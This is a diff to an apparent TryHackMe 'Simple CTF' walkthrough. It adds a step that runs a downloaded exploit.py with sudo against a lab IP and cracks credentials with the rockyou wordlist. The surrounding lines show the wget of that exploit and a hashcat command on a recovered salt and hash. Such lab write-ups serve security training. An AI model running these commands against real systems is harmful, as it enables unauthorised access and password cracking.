@@ -31,6 +31,11 @@ Once you have identified the CVE, download the updated python script as shown be
 ```
   wget https://raw.githubusercontent.com/gray-area/THM/main/SimpleCTF/exploit.py
 ```
+After you have run the above command, run the following command to run the exploit.py script.
+```
+  sudo python3 exploit.py -u http://10.10.x.x --crack -w /usr/share/wordlists/rockyou.txt
+```
+
 After the exploit.py script runs, there will be an output of the username, salt and hash. Use the salt and hash as shown below.
 ```
   hashcat -m 20 0c01f4468bxxxxxxxxxxx73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
